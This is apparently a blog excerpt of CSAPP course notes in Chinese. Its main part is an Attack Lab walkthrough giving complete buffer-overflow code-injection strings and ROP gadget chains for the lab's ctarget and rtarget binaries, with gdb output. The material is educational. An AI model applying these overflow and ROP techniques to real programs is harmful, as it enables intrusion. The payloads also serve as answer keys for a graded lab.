<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># You can modify this portion</span><br><span class="line">	# Loop header</span><br><span class="line">	xorq %rax,%rax		# count = 0;</span><br><span class="line">	andq %rdx,%rdx		# len &lt;= 0?</span><br><span class="line">	jle Done		# if so, goto Done:</span><br><span class="line"></span><br><span class="line">Loop:	mrmovq (%rdi), %r10	# read val from src...</span><br><span class="line">	rmmovq %r10, (%rsi)	# ...and store it to dst</span><br><span class="line">	andq %r10, %r10		# val &lt;= 0?</span><br><span class="line">	jle Npos		# if so, goto Npos:</span><br><span class="line">	iaddq $1, %rax		# count++</span><br><span class="line">Npos:	</span><br><span class="line">	iaddq $-1, %rdx		# len--</span><br><span class="line">	iaddq $8, %rdi		# src++</span><br><span class="line">	iaddq $8, %rsi		# dst++</span><br><span class="line">	andq %rdx,%rdx		# len &gt; 0?</span><br><span class="line">	jg Loop			# if so, goto Loop:</span><br></pre></td></tr></table></figure>
<p>Average CPE: 12.70</p>
<p>采用循环展开，通过增加每次迭代计算的元素的数量，减少循环的迭代次数。</p>
<p>要减少CPE，需要尽可能充分利用时钟周期，即让每个时钟周期执行对我们的结果有意义的指令。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">mrmov<span class="string">q (<span class="variable">%rdi</span>)</span>, <span class="variable">%r10</span>	<span class="comment"># read val from src...</span></span><br><span class="line">rmmovq <span class="variable">%r10</span>, (<span class="variable">%rsi</span>)	<span class="comment"># ...and store it to dst</span></span><br></pre></td></tr></table></figure>
<p>第二条指令在译码阶段需要读取%r10寄存器中的值，但第一条指令直到访存阶段才能读取出应该放到%r10寄存器中的值，出现加载/使用数据冒险，编译器会在此间加入一个气泡，可以利用这个时钟周期，执行有意义的指令，预先读出后面内存中的值来提高时钟周期的利用率。</p>
<p>这里采用四次循环展开，前面4个为一组处理后，剩下的长度可能为1,2,3。通过在Recover中恢复剩余的元素个数。如果小于等于0的话，说明初始长度为4的倍数，直接返回，否则还要复制相应个数的元素。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># You can modify this portion</span><br><span class="line">	# Loop header</span><br><span class="line">	xorq %rax,%rax		# count = 0;</span><br><span class="line">	iaddq $-4,%rdx		# len &lt;= 0?</span><br><span class="line">	jl Recover		# if so, goto Done:</span><br><span class="line"></span><br><span class="line">Loop4:	mrmovq (%rdi), %r10	# read val from src...</span><br><span class="line">	mrmovq 8(%rdi), %r11</span><br><span class="line">	mrmovq 16(%rdi), %r12</span><br><span class="line"></span><br><span class="line">	rmmovq %r10, (%rsi)	# ...and store it to dst</span><br><span class="line">	andq %r10, %r10		# val &lt;= 0?</span><br><span class="line">	jle Npos		# if so, goto Npos:</span><br><span class="line">	iaddq $1, %rax		# count++</span><br><span class="line">Npos:	</span><br><span class="line">	rmmovq %r11, 8(%rsi)</span><br><span class="line">	andq %r11, %r11</span><br><span class="line">	jle Npos1</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">Npos1:</span><br><span class="line">	mrmovq 24(%rdi), %r13</span><br><span class="line">	rmmovq %r12, 16(%rsi)</span><br><span class="line">	andq %r12, %r12</span><br><span class="line">	jle Npos2</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">Npos2:</span><br><span class="line">	rmmovq %r13, 24(%rsi)</span><br><span class="line">	andq %r13, %r13</span><br><span class="line">	jle Npos3</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">Npos3:</span><br><span class="line">	iaddq $32, %rdi		# src++</span><br><span class="line">	iaddq $32, %rsi		# dst++</span><br><span class="line">	iaddq $-4, %rdx		# len-- len &gt; 0?</span><br><span class="line">	jge Loop4		# if so, goto Loop:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Recover:</span><br><span class="line">	iaddq $4,%rdx		# len &lt;= 0?</span><br><span class="line">	jle Done</span><br><span class="line"></span><br><span class="line">	mrmovq (%rdi), %r10	# read val from src...</span><br><span class="line">	mrmovq 8(%rdi), %r11</span><br><span class="line">	</span><br><span class="line">	rmmovq %r10, (%rsi)	# ...and store it to dst</span><br><span class="line">	andq %r10, %r10		# val &lt;= 0?</span><br><span class="line">	jle Npos4		# if so, goto Npos:</span><br><span class="line">	iaddq $1, %rax		# count++</span><br><span class="line">Npos4:	</span><br><span class="line">	iaddq $-1, %rdx</span><br><span class="line">	jle Done </span><br><span class="line"></span><br><span class="line">	rmmovq %r11, 8(%rsi)</span><br><span class="line">	andq %r11, %r11</span><br><span class="line">	jle Npos5</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">Npos5:</span><br><span class="line">	iaddq $-1, %rdx</span><br><span class="line">	jle Done </span><br><span class="line">	mrmovq 16(%rdi), %r12</span><br><span class="line">	rmmovq %r12, 16(%rsi)</span><br><span class="line">	andq %r12, %r12</span><br><span class="line">	jle Done</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">##################################################################</span><br><span class="line"># Do not modify the following section of code</span><br><span class="line"># Function epilogue.</span><br><span class="line">Done:</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
<p>这里会有条件跳转，在pipe-full.hcl的描述中，是跳转到跳转条件满足的位置，即跳转到Done，但Done后面紧跟ret返回，而大多数情况是跳转到跳转条件不满足的位置，继续向下执行。因此如果跳转到Done执行后面的指令会浪费时钟周期，而如果继续向下执行，读取内存中的值时，如果之后需要用到，则可以利用当前的时钟周期。修改pipe-full.hcl为分支条件不满足的位置，即jmp后面的那条指令位置。</p>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022104261.png" alt="image-20211202210413232"></p>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022104201.png" alt="image-20211202210453153"></p>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022105552.png" alt="image-20211202210506511"></p>
<p>最终Score: 60</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/06/16/%E9%A1%B9%E7%9B%AE/CSAPP/CSAPP%20Attack%20Lab/</url>
    <content><![CDATA[<h1>Attack Lab</h1>
<p><a href="https://www.jianshu.com/p/db731ca57342">CSAPP:Attack lab - 简书 (jianshu.com)</a></p>
<h2 id="代码注入攻击">代码注入攻击</h2>
<h3 id="level-1">level 1</h3>
<p>反汇编test和getbuf函数，看到getbuf的栈空间大小为0x28，即40字节。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>test</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111261040430.png" alt="image-20211126104027322"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>getbuf</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111261041743.png" alt="image-20211126104154718"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>touch1</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disas touch1</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004017c0 &lt;+0&gt;:		sub    $0x8,%rsp</span><br><span class="line">   0x00000000004017c4 &lt;+4&gt;:		movl   $0x1,0x202d0e(%rip)        # 0x6044dc &lt;vlevel&gt;</span><br><span class="line">   0x00000000004017ce &lt;+14&gt;:	mov    $0x4030c5,%edi</span><br><span class="line">   0x00000000004017d3 &lt;+19&gt;:	callq  0x400cc0 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004017d8 &lt;+24&gt;:	mov    $0x1,%edi</span><br><span class="line">   0x00000000004017dd &lt;+29&gt;:	callq  0x401c8d &lt;validate&gt;</span><br><span class="line">   0x00000000004017e2 &lt;+34&gt;:	mov    $0x0,%edi</span><br><span class="line">   0x00000000004017e7 &lt;+39&gt;:	callq  0x400e40 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>查看touch1的地址，用touch1的地址覆盖原来的返回地址</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">c0</span> <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
<p>将每个字节的十六进制表示通过hex2raw转换为字符串，并将得到的字符串作为ctarget的输入。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111271848491.png" alt="image-20211127184819454"></p>
<h3 id="level-2">level 2</h3>
<p>插入一段代码作为攻击字符串（exploit string）的一部分。</p>
<p>设置断点，查看栈顶地址。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) break getbuf</span><br><span class="line">(gdb) run -q</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">=&gt; 0x00000000004017a8 &lt;+0&gt;:	sub    $0x28,%rsp</span><br><span class="line">   0x00000000004017ac &lt;+4&gt;:	mov    %rsp,%rdi</span><br><span class="line">   0x00000000004017af &lt;+7&gt;:	callq  0x401a40 &lt;Gets&gt;</span><br><span class="line">   0x00000000004017b4 &lt;+12&gt;:	mov    $0x1,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;:	add    $0x28,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) print /x $rsp</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = 0x5561dca0</span></span><br><span class="line">(gdb) stepi</span><br><span class="line">14	in buf.c</span><br><span class="line">(gdb) print /x $rsp</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = 0x5561dc78</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111261054068.png" alt="image-20211126105412037"></p>
<p>touch2需要接受一个参数，这个参数需要与cookie值相同，函数的第一个参数通过寄存器%rdi传递，同时设置完参数后需要将控制流转移到touch2，查看touch2的开始地址。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111271902954.png" alt="image-20211127190235909"></p>
<p>因此汇编代码，将touch2的地址压入栈顶，ret会弹出栈顶元素作为返回地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq  $0x59b997fa, %rdi		</span><br><span class="line">pushq $0x4017ec                </span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>对汇编代码汇编生成目标文件，对目标代码反汇编，得到指令序列的字节表示</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c level2.s</span><br><span class="line">objdump -d level2.o &gt; level2.d</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111271908668.png" alt="image-20211127190828639"></p>
<p>得到攻击字符串的字节序列：</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">48 </span>c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">68</span> ec <span class="number">17</span>     </span><br><span class="line"><span class="symbol">40 </span><span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="symbol">78 </span>dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>			/* 栈顶地址<span class="number">0</span>x5561dc78 */</span><br></pre></td></tr></table></figure>
<p>验证</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; solution2.txt | ./ctarget -q</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111271911851.png" alt="image-20211127191142818"></p>
<h3 id="level3">level3</h3>
<p>touch3函数接受一个指向字符数组首地址的指针作为参数</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111271958123.png" alt="image-20211127195837095"></p>
<p>hexmatch接受cookie和字符数组作为参数，将cookie转化为字符串“59b997fa”，字符串的最后会有一个空字符/0作为结束符，十六进制表示为00，strncmp函数比较了9个字符，因此在字符数组后面跟上结束符00</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111272002553.png" alt="image-20211127200218526"></p>
<p>查看getbuf，在函数返回前会修改栈顶的位置，释放占用的栈空间，而此时通过转移程序控制流执行touch3函数，调用hexmatch时会在栈上分配空间，因此touch3的参数指向的字符数组位置不能放在getbuf申请的占空间上。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111272003989.png" alt="image-20211126104154718"></p>
<p>test的栈空间之后不会用到，因此将cookie的字符数组表示放在test的栈空间中。cookie为0x59b997fa，表示为十六进制为35 39 62 39 39 37 66 61 00，栈空间组织如下。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111272046849.png" alt="image-20211127204653792"></p>
<p>getbuf栈空间应该执行的汇编代码：将字符数组的首地址通过%rdi寄存器传递给函数touch3，同时设置返回地址为touch3的首地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq $0x5561dca8, %rdi     </span><br><span class="line">pushq $0x4018fa            </span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>生成指令字节序列</p>
<blockquote>
<p>gcc -c level3.s     将汇编代码变成机器代码</p>
<p>objdump -d level3.o &gt;level3.d  将机器代码反编译成汇编代码</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111272051563.png" alt="image-20211127205117537"></p>
<p>对应攻击字符串的字节序列</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">48</span> c7 c7 a8 dc <span class="number">61</span> <span class="number">55</span> <span class="number">68</span> </span><br><span class="line"><span class="attribute">fa</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>             </span><br><span class="line"><span class="attribute">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span></span><br><span class="line"><span class="attribute">00</span></span><br></pre></td></tr></table></figure>
<p>验证</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; solution3.txt | ./ctarget -q</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111272054939.png" alt="image-20211127205424905"></p>
<h2 id="ROP攻击">ROP攻击</h2>
<p>在rtarget中，采用了两种方法来对抗栈溢出攻击：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>栈随机化</p>
<p>设置断点，运行两次查看%rsp栈顶的值，发现其值发生变化。这意味着无法知道getbuf申请栈空间后的栈顶值，从而无法将我们的可执行代码的字节序列以字符串的形式插入到相应的位置。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281920181.png" alt="image-20211128192038064"></p>
</li>
<li class="lvl-2">
<p>限制可执行代码区域，栈为不可执行区域</p>
</li>
</ul>
<p>rtarget中没有进行栈破坏检测，因此可以通过破话test的栈帧来达到幸运的目的。</p>
<h3 id="level2">level2</h3>
<p>touch2接受一个参数，需要通过寄存器%rdi来传递，因此可以先把cookie值存放在栈中，通过popq指令获得这个值。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281931624.png" alt="image-20211128193143591"></p>
<p>根据提示，在start_farm和end_farm中查找满足要求的指令编码：</p>
<p>指令编码需要满足一定要求，nop的指令编码为0x90，ret的指令编码为0xc3，我们通过popq指令或许栈顶的值后，不能有其他的无效指令或者别的指令对结果造成影响。</p>
<p>因此，如果指令为popq %rax，可以寻找的指令编码为 58 （90） c3，可以找到两处符合要求的。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281943601.png" alt="image-20211128194353528"></p>
<p>最后的结果时可以找到popq %rdi，直接将想应的值送到%rdi寄存器，查找5f (90) c3，没有找到符合的结果，因此只能先将cookie值传递到一个中间寄存器，在传递到%rdi寄存器中。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281946805.png" alt="image-20211128194608732"></p>
<p>这一题只需要用到start_farm到mid_farm中的指令编码，通过查找，找到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x4019cc       58 		popq %rax</span><br><span class="line">               90		nop</span><br><span class="line">               c3		ret</span><br></pre></td></tr></table></figure>
<p>这样的话，通过查看movq指令的编码，需要查找的指令编码为48 89 c7 (90) c3</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281950804.png" alt="image-20211128195027771"></p>
<p>这里可以找到两个符合要求的结果：</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281952447.png" alt="image-20211128195203377"></p>
<p>使用的指令编码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x4019a2	48 89 c7	movq %rax, %rdi</span><br><span class="line">			c3			ret</span><br></pre></td></tr></table></figure>
<p>因此栈可以组织如下：</p>
<p>当getbuf函数返回时，返回地址为0x4019cc，同时栈顶为红色位置。</p>
<p>在0x4019cc，执行popq %rax操作，此时栈顶指向的值为0x4019a2，执行ret指令，将这个值作为返回地址。</p>
<p>执行完0x4019a2处的指令后，将0x4017ec作为返回地址，执行touch2。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282010992.png" alt="image-20211128201044882"></p>
<p>对应攻击字符串的字节序列：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">cc</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           /* popq %rax */</span><br><span class="line"><span class="attribute">fa</span> <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           /* cookie    */</span><br><span class="line"><span class="attribute">a2</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">ec</span> <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282016927.png" alt="image-20211128201617892"></p>
<h3 id="level3-2">level3</h3>
<p>同代码注入攻击的level3，需要将cookie的字符串十六进制表示存储在某一位置，这一位置不能在getbuf栈帧中，因此需要在test栈帧中。其表示需要占用9个字节，可以考虑放在最近的位置，也就是返回地址的上面，返回地址是我们第一个可以操作的地方，这是要得到%rsp，即cookie字符串首地址的值。movq %rsp, D的指令编码为48 89 eX(X不确定)，查找：</p>
<p>可以查找到相关指令编码，这时栈顶指向字符串的首地址，而字符串占了两个8字节，后面需要跟两个pop指令让栈顶指向后面的位置，在后面的位置我们可以操作填上其他的地址，以供ret指令返回到相应的位置，但查找不到想应的指令序列。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282027821.png" alt="image-20211128202754741"></p>
<p>不能通过栈顶地址确定cookie字符串的地址，则cookie可以放在之后的位置，通过首地址+偏移量来确定其位置，但此时依旧需要先确定栈顶位置，并保存其值，因此先查找48 89 eX，看可以使用的指令编码：</p>
<p>找到的序列只有48 89 e0 c3可以满足要求，对应指令movq %rsp, %rax。现在看通过%rax可以将值传递到哪个寄存器，查找48 49 cX：</p>
<p>只能找到48 89 c7，可以实现%rax -&gt; %rdi，当前无法向下继续进行，查看另外两个指令编码。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282051440.png" alt="image-20211128205105364"></p>
<p>根据实验提供的相应andb、orb、cmpb、testb指令可以指导出现这样的两个字节指令编码时不影响相关寄存器的值，因此存在于我们想要的指令后面。观察相应指令特征，来进行查找：</p>
<p>对于movl类指令查找：</p>
<table>
<thead>
<tr>
<th>movl</th>
<th>andb、orb、cmpb、testb</th>
<th>ret</th>
</tr>
</thead>
<tbody>
<tr>
<td>89 ( )</td>
<td>(20、08、38、84)  (c0、c9、d2、db)</td>
<td>c3</td>
</tr>
</tbody>
</table>
<p>其中90也是不影响结果的，可以出现在相应中间位置。查找到的相关指令，可以看出可以实现%eax -&gt; %edx -&gt; %esi的传递。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282043655.png" alt="image-20211128204306609"></p>
<p>同时之前level2可以找到popq %rax指令，因此可以将偏移量存放在栈中，通过pop指令来进行传递给%esi。然后可以基址+偏移量来确定地址。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282055203.png" alt="image-20211128205504176"></p>
<p>现在还无法确定偏移量的值应该为多少，先通过之前的分析，确定程序的控制流：</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282116865.png" alt="image-20211128211625690"></p>
<p>可以确定偏移量为72=0x48</p>
<p>对应攻击字符串的字节序列：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">06</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">a2</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">ab</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">42</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">69</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">27</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">d6</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">a2</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">fa</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span></span><br><span class="line"><span class="attribute">00</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282118763.png" alt="image-20211128211834719"></p>
]]></content>
  </entry>
  <entry>
    <title>CSAPP</title>
    <url>/2023/06/16/%E9%A1%B9%E7%9B%AE/CSAPP/CSAPP/</url>
    <content><![CDATA[<h1>第3章 程序的机器级表示</h1>
<h2 id="寄存器">寄存器</h2>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111192134619.png" alt="image-20211119213426522"></p>
<h2 id="操作数格式">操作数格式</h2>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111041123574.png" alt="img"></p>
<h2 id="mov后缀">mov后缀</h2>
<blockquote>
<p>b: 1字节									al</p>
<p>w: 2字节									ax</p>
<p>l												 eax</p>
<p>q												rax</p>
</blockquote>
<h2 id="2-条件码">2. 条件码</h2>
<h3 id="2-1-标志位">2.1 标志位</h3>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111081045189.png" alt="image-20211108104541048"></p>
<h3 id="2-2-set指令">2.2 set指令</h3>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111081046782.png" alt="image-20211108104638724"></p>
<h4 id="a、b比较：cmp-b-a">a、b比较：cmp b, a</h4>
<table>
<thead>
<tr>
<th style="text-align:center">有符号数比较:  greater lower</th>
<th></th>
<th style="text-align:center">无符号数比较：above below</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">a&lt;b</td>
<td>a&gt;=b</td>
<td style="text-align:center">a&lt;b</td>
<td>a&gt;=b</td>
</tr>
<tr>
<td style="text-align:center">OF=0 SF=1</td>
<td>OF=0 SF=0</td>
<td style="text-align:center">CF=1</td>
<td></td>
</tr>
<tr>
<td style="text-align:center">OF=1 SF=0</td>
<td>OF=1</td>
<td style="text-align:center">CF=1</td>
<td></td>
</tr>
</tbody>
</table>
<h4 id="有符号数比较">有符号数比较</h4>
<p>SF OF ZF</p>
<h4 id="无符号数比较">无符号数比较</h4>
<p>CF ZF</p>
<h3 id="2-3-跳转指令">2.3 跳转指令</h3>
<h4 id="jump">jump</h4>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111092219784.png" alt="image-20211109221922634"></p>
<h4 id="条件跳转指令">条件跳转指令</h4>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111092220475.png" alt="image-20211109222026421"></p>
<h3 id="过程">过程</h3>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111101706596.png" alt="image-20211110170645507"></p>
<h3 id="栈帧">栈帧</h3>
